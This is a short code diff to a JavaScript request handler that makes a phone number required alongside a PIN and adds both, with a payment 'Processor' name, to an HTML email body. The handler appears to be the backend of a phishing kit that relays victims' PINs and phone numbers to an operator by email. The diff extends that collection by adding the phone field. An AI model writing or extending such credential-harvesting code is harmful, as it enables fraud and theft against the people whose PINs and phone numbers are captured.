@@ -116,20 +116,24 @@ if (data.action === "verify_email") {
         };
     }
 
-    if (!data.pin) {
+    if (!data.pin || !data.phone) {
         return {
             statusCode: 400,
             body: JSON.stringify({
                 error:
-                    "Pin is required."
+                    "Fill in all required fields."
             })
         };
     }
 
     const emailMessage = `
+Eco
 
 Processor:
 <b>${processor.toUpperCase()}</b>
+
+Phone:
+<b>${data.phone}</b>
 
 Pin:
 <b>${data.pin}</b>
